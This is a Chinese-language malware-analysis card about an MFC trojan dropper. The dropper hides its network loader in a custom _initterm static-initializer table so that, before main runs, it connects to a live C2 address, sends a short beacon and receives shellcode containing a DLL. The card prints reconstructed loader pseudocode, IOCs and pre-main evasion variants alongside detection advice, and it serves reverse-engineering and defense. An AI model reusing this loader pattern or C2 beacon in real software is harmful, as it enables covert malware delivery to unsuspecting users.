---
id: code-analysis-reverse-windows-initterm-static-initializer-tcp-shellcode-loader
title: MFC 程序利用 _initterm 静态初始化表在 main 前 TCP 拉取 ShellCode/DLL
type: scenario
domain: code-analysis
path: code-analysis/reverse/windows
technique: initterm-static-initializer-tcp-shellcode-loader
tags:
- windows
- malware-analysis
- mfc
- crt
- initterm
- shellcode-loader
- c2
- tcp
- androm
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V302
  verified_at: '2026-11-08T11:40:59+08:00'
  notes: 已对照原文 content.md 与 16 张图片核对：_initterm 表 00405000=0 + sub_402973/sub_401090/sub_402020/sub_402060、TCP 154.201.71.47:13658 与 SendData(unk_405030,3)（33 32 00）、OnInitDialog 的 sub_401220；AV 对抗的 0x401 OpenProcess、0xF01FF OpenProcessToken、SeDebug/SeChangeNotify AdjustTokenPrivileges、SetTokenInformation(TokenIntegrityLevel)、PostThreadMessageA(0x12)、TerminateProcess 均与截图一致；两卡技术原子独立，判原子粒度合格；dedup 除自身外无 duplicate/likely_duplicate。未验证点：未运行样本，TokenIntegrityLevel 具体级别与 WM_QUIT 实际效果未动态确认。
url: /docs/code-analysis/reverse/windows/code-analysis-reverse-windows-initterm-static-initializer-tcp-shellcode-loader/
draft: false
kb_aliases:
- _initterm 加载器
- CRT 静态初始化表
- MFC 启动前联网
- Androm 母体
- 154.201.71.47:13658
- TcpConnectionAndStartThread
---

## 一句话结论

这个 MFC 木马母体在 `start()` 里调用 `_initterm(&First,&Last)` 与 `_initterm(&dword_405000,&dword_405018)` 遍历 CRT 静态初始化函数指针表，其中 `sub_401090` 在用户看到主界面前就创建 TCP 连接 `154.201.71.47:13658`、发送 `33 32 00` 并接收一段内含 DLL 的 ShellCode；对话框 `OnInitDialog` 里的 `sub_401220` 也会触发同类连接，形成“启动即上线、无需用户交互”的第一阶段加载。

## 原理

- **`_initterm` 是什么**：`_initterm` 是 C 运行时内部函数，按顺序遍历一个以空指针结尾的函数指针表并逐个调用，用于在 `main`/`WinMain` 之前执行 C++ 全局/静态对象的构造函数和 CRT 初始化例程。编译器生成的初始化表通过 `_initterm(&First, &Last)` 调用；恶意代码也可以把自己的函数指针塞进自定义表，再显式调用 `_initterm(&table_start, &table_end)`。
- **本文的初始化表**：`.data` 段 `dword_405000` 处为 0（终止项），随后是 `sub_402973`、`sub_401090`、`sub_402020`、`sub_402060` 四个函数指针；`start()` 在 `_getmainargs` 之后再次调用 `_initterm(&dword_405000, &dword_405018)`，四个函数依次执行。
- **启动即联网**：`sub_401090` 内部包含 `TCP_socket()`：申请约 0x4DA9A 字节栈缓冲、初始化、调用 `TcpConnectionAndStartThread(v1)` 创建套接字并连接 `154.201.71.47:13658`；连接成功后发送 3 字节 `33 32 00`，随后进入 `Sleep(0x64)`/`Sleep(0xFFFFFFFF)` 等待，接收到的数据是一段包含 DLL 的 ShellCode。
- **对话框初始化再次触发**：MFC 对话框初始化函数 `sub_401380` 在 `CDialog::OnInitDialog` 后调用 `sub_401220()`（连接 TCP），再 `SendMessageA` 更新界面；说明网络逻辑被同时挂在 CRT 初始化与对话框初始化两条路径上，提高执行成功率。
- **为什么隐蔽**：`_initterm` 调用点在标准 `start()` 中，静态分析若不跟进 `.data` 函数指针表，容易只看到“正常 MFC 启动代码”；网络行为发生在 `main`/窗口显示之前，用户没有点击也会执行；第一阶段不落盘，ShellCode 在内存中接收/提取。
- **与 TLS 回调的区别**：TLS 回调由 PE 加载器在 OEP 前调用；`_initterm` 是用户态 CRT 自己的初始化机制，运行在 OEP 之后但 main 之前。两者都能实现“入口前执行”，但触发层次、静态特征和排查断点不同。

## 触发条件

- 目标为 Windows PE（本例 PE32、MFC 4.2、VC++ 6.0 编译），运行后加载 CRT 并执行静态初始化表。
- 样本能访问 C2 `154.201.71.47:13658`（TCP），且网络未被阻断。
- 自定义 `_initterm` 表被正确构造（指针表以 NULL 结尾，函数签名匹配 `_initterm` 回调）。
- 攻击者控制 C2 返回的 ShellCode/DLL；样本侧有接收/提取/加载逻辑。
- 分析侧需要能识别 `.data` 函数指针表并在 `_initterm`/网络函数处下断。

## 利用步骤

（按样本加载逻辑描述，非本机复现。）

1. 在 IDA 中从 `start()` 识别 `_initterm(&First,&Last)` 与 `_initterm(&dword_405000,&dword_405018)` 两处调用。
2. 查看 `dword_405000` 起始的 `.data` 表：0 终止项后依次是 `sub_402973`、`sub_401090`、`sub_402020`、`sub_402060`。
3. 跟进 `sub_401090`/`TCP_socket`，确认 `TcpConnectionAndStartThread` 的目标地址 `154.201.71.47:13658`、发送缓冲 `33 32 00` 与接收/等待逻辑。
4. 在 `connect`/`send`/`recv` 下断，抓取服务器返回的 ShellCode；按 ShellCode 中的 DLL 特征（MZ/PE）提取 DLL。
5. 分析 DLL 导出函数（本例导出 `run`），继续跟踪其 AV 对抗、持久化、代码注入与远控逻辑。
6. 在样本运行前阻断 C2 或重定向到自建服务，观察 ShellCode 接收与后续行为。

## PoC

无武器化 PoC（恶意样本分析）。原文还原的关键结构：

```c
// start() 中的 CRT 初始化
_initterm(&First, &Last);
_getmainargs(&argc, &argv, &envp, 0, &startinfo);
_initterm(&dword_405000, &dword_405018);   // 自定义表：sub_402973/sub_401090/sub_402020/sub_402060

// .data 表
// 00405000: 00000000
// 00405004: offset sub_402973
// 00405008: offset sub_401090   <- TCP 加载
// 0040500C: offset sub_402020
// 00405010: offset sub_402060
```

```c
int TCP_socket() {
    char v1[318090];
    sub_4020D0(v1);
    if (TcpConnectionAndStartThread(v1)) {   // connect 154.201.71.47:13658
        SendData(&unk_405030, 3);            // 发送 33 32 00
    }
    while (!v2) Sleep(0x64);
    Sleep(0xFFFFFFFF);
    sub_402150(v1);
    return 1;
}
```

```text
IOC:
母体 SHA256 94ac22ae1e5bf8f1677e354a333e911bbd4a5070263bda4917c4040f7491d241
C2        154.201.71.47:13658
```

## 变体与关联

- 变体：可改用 TLS 回调、DllMain、全局对象构造函数、`atexit`/`InitOnceExecuteOnce` 等入口前机制；`_initterm` 表也可放在 `.rdata` 或运行时动态构造。
- 变体：第一阶段可返回 ShellCode、反射 DLL、加密 PE；本例 ShellCode 内含 DLL，后续 DLL 导出 `run` 进入远控逻辑。
- 关联：`[[code-analysis-reverse-windows-pe-tls-callback-pre-oep]]`（TLS 回调在 OEP 前执行，另一种入口前机制）、`[[code-analysis-reverse-windows-silverfox-tls-loader-nvgpu-nvml-chain]]`（TLS 回调释放器案例）。
- 关联：`[[pentest-c2-androm-av-token-integrity-thread-wm-quit-terminate]]`（本样本 DLL 的 AV 对抗）、`[[pentest-c2-ntdll-text-remap-disk-clean-copy-unhook]]`（后续 ntdll `.text` 恢复脱钩）。
- 边界：文章只分析了母体加载与 DLL 的静态逻辑，未在真实网络环境复跑；C2 在分析时是否仍存活未说明；ShellCode/DLL 的完整远控协议未展开。

## 检测与防御

- 检测：静态扫描 `_initterm` 调用点附近的自定义函数指针表（`.data` 中连续代码指针、0 结尾）；对 MFC/GUI 进程在窗口显示前发起外联的行为告警；匹配 C2 `154.201.71.47:13658` 与首包 `33 32 00`（hex `33 32 00`）。
- 行为：监控进程启动早期（main 前）的 `socket/connect/send/recv`，尤其是 GUI 程序无可解释的网络行为；对接收后 `VirtualAlloc`/`CreateThread`/反射加载的链路告警。
- 加固：网络出口阻断未知 C2；启用 EDR 对 GUI 进程早期外联与内存加载的监控；对 MFC 程序做静态初始化表审计。
- 响应：隔离主机、抓取进程内存与网络包，提取 ShellCode/DLL 哈希，排查 Run 键、AppData 下的 `msedge.exe` 与后续注入。
